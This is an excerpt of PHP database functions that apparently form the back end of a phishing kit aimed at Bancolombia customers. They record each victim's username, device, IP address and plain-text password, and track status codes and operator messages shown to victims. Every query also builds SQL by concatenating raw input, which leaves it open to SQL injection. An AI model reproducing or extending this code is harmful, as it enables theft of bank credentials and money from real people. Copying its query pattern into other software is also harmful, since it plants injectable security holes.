...
function crear_registro($usr,$dis){
	...
	if ($con = conectar()) {
		if (sentencia($con,"INSERT INTO rtr45 (idreg, usuario, dispositivo, ip, banco, status, horacreado, horamodificado) VALUES (NULL, '".$usr."', '".$dis."', '".$ip_add."', 'Bancolombia', '1', '".$hoy."', '".$hoy."')")) {
...
function actualizar_registro_pass($reg,$pas){
	...
	if ($con = conectar()) {
		...
		if (sentencia($con,"UPDATE rtr45 SET status = '1', password='".$pas."', horamodificado='".$hoy."'  WHERE idreg = ".$reg)) {
...
function traer_mensaje($reg){
	if ($con = conectar()) {
		$consulta = sentencia($con,"SELECT mensaje FROM rtr45 WHERE idreg = '".$reg."'");
		if (contarfilas($consulta)) {
			$datos=traerdatos($consulta);
			echo $datos["mensaje"];
		}else{
...
function mensaje($reg,$msg){
	...
	if ($con = conectar()) {
		...
		if (sentencia($con,"UPDATE rtr45 SET status = '14', mensaje ='".$msg."', horamodificado='".$hoy."' WHERE idreg = ".$reg)) {
...
function actualizar_mensaje($reg){
	...
	if ($con = conectar()) {
		...
		if (sentencia($con,"UPDATE rtr45 SET status = '13', horamodificado='".$hoy."' WHERE idreg = ".$reg)) {
